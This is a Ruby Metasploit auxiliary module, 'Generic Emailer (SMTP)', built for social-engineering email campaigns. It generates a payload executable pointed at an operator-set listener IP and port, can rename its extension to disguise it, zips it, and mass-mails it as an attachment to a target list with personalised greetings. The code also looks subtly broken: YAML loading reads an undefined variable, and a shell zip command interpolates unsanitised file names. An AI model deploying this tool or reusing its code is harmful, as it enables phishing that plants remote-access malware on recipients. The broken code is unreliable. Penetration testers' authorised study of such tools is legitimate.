##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'yaml'


class Metasploit3 < Msf::Auxiliary

	#
	# This module sends email messages via smtp
	#
	include Msf::Exploit::Remote::SMTPDeliver
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Generic Emailer (SMTP)',
			'Description'    => %q{
					This module can be used to automate email delivery.
				This code is based on Joshua Abraham's email script for social
				engineering.
			},
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://spl0it.org/' ],
				],
			'Author'         => [ 'et <et[at]metasploit.com>' ]))

			register_options(
				[
					OptString.new('RHOST', [true, "SMTP server address",'127.0.0.1']),
					OptString.new('RPORT', [true, "SMTP server port",'25']),
					OptString.new('YAML_CONFIG', [true, "Full path to YAML Configuration file",
						File.join(Msf::Config.install_root, "data","emailer_config.yaml")]),
				], self.class)

		# Hide this option from the user
		deregister_options('MAILTO')
		deregister_options('SUBJECT')
	end

	def load_yaml_conf
		opts = {}

		File.open(datastore['YAML_CONFIG'], "rb") do |f|
			yamlconf = YAML::load(fileconf)

			opts['to']                   = yamlconf['to']
			opts['from']                 = yamlconf['from']
			opts['subject']              = yamlconf['subject']
			opts['type']                 = yamlconf['type']
			opts['msg_file']             = yamlconf['msg_file']
			opts['wait']                 = yamlconf['wait']
			opts['add_name']             = yamlconf['add_name']
			opts['sig']                  = yamlconf['sig']
			opts['sig_file']             = yamlconf['sig_file']
			opts['attachment']           = yamlconf['attachment']
			opts['attachment_file']      = yamlconf['attachment_file']
			opts['attachment_file_type'] = yamlconf['attachment_file_type']
			opts['attachment_file_name'] = yamlconf['attachment_file_name']

			### payload options ###
			opts['make_payload']         = yamlconf['make_payload']
			opts['zip_payload']          = yamlconf['zip_payload']
			opts['msf_port']             = yamlconf['msf_port']
			opts['msf_ip']               = yamlconf['msf_ip']
			opts['msf_payload']          = yamlconf['msf_payload']
			opts['msf_filename']         = yamlconf['msf_filename']
			opts['msf_change_ext']       = yamlconf['msf_change_ext']
			opts['msf_payload_ext']      = yamlconf['msf_payload_ext']
		end

		opts
	end

	def load_file(fname)
		buf = ''
		File.open(fname, 'rb') do |f|
			buf = f.read
		end

		buf
	end

	def run

		yamlconf = load_yaml_conf

		fileto               = yamlconf['to']
		from                 = yamlconf['from']
		subject              = yamlconf['subject']
		type                 = yamlconf['type']
		msg_file             = yamlconf['msg_file']
		wait                 = yamlconf['wait']
		add_name             = yamlconf['add_name']
		sig                  = yamlconf['sig']
		sig_file             = yamlconf['sig_file']
		attachment           = yamlconf['attachment']
		attachment_file      = yamlconf['attachment_file']
		attachment_file_type = yamlconf['attachment_file_type']
		attachment_file_name = yamlconf['attachment_file_name']

		make_payload         = yamlconf['make_payload']
		zip_payload          = yamlconf['zip_payload']
		msf_port             = yamlconf['msf_port']
		msf_ip               = yamlconf['msf_ip']
		msf_payload          = yamlconf['msf_payload']
		msf_filename         = yamlconf['msf_filename']
		msf_change_ext       = yamlconf['msf_change_ext']
		msf_payload_ext      = yamlconf['msf_payload_ext']

		tmp = Dir.tmpdir

		datastore['MAILFROM'] = from

		msg       = load_file(msg_file)
		email_sig = load_file(sig_file)

		if (type !~ /text/i and type !~ /text\/html/i)
			print_error("YAML config: #{type}")
		end

		if make_payload
			attachment_file = File.join(tmp, msf_filename)
			attachment_file_name = msf_filename

			print_status("Creating payload...")
			mod = framework.payloads.create(msf_payload)
			if (not mod)
				print_error("Failed to create payload, #{msf_payload}")
				return
			end

			# By not passing an explicit encoder, we're asking the
			# framework to pick one for us.  In general this is the best
			# way to encode.
			buf = mod.generate_simple(
					'Format'  => 'raw',
					'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
				)
			exe = generate_payload_exe({
					:code => buf,
					:arch => mod.arch,
					:platform => mod.platform
				})

			print_status("Writing payload to #{attachment_file}")
			# XXX If Rex::Zip will let us zip a buffer instead of a file,
			# there's no reason to write this out
			File.open(attachment_file, "wb") do |f|
				f.write(exe)
			end

			if msf_change_ext
				msf_payload_newext = attachment_file
				msf_payload_newext = msf_payload_newext.sub(/\.\w+$/, ".#{msf_payload_ext}")
				File.rename(attachment_file, msf_payload_newext)
				attachment_file = msf_payload_newext
			end

			if zip_payload
				zip_file = attachment_file.sub(/\.\w+$/, '.zip')
				system("zip -r #{zip_file} #{attachment_file}> /dev/null 2>&1");
				attachment_file      = zip_file
				attachment_file_type = 'application/zip'
			else
				attachment_file_type = 'application/exe'
			end

		end


		File.open(fileto, 'rb').each do |l|
			next if l !~ /\@/

			nem = l.split(',')
			name = nem[0].split(' ')
			fname = name[0]
			lname = name[1]
			email = nem[1]


			if add_name
				email_msg_body = "#{fname},\n\n#{msg}"
			else
				email_msg_body = msg
			end

			if sig
				data_sig = load_file(sig_file)
				email_msg_body = "#{email_msg_body}\n#{data_sig}"
			end

			print_status("Emailing #{name[0]} #{name[1]} at #{email}")

			mime_msg = Rex::MIME::Message.new
			mime_msg.mime_defaults

			mime_msg.from = from
			mime_msg.to = email
			datastore['MAILTO'] = email.strip
			mime_msg.subject = subject

			mime_msg.add_part(Rex::Text.encode_base64(email_msg_body, "\r\n"), type, "base64", "inline")

			if attachment
				if attachment_file_name
					data_attachment = load_file(attachment_file)
					mime_msg.add_part(Rex::Text.encode_base64(data_attachment, "\r\n"), attachment_file_type, "base64", "attachment; filename=\"#{attachment_file_name}\"")
				end
			end

			send_message(mime_msg.to_s)
			select(nil,nil,nil,wait)
		end

		print_status("Email sent..")
	end

end
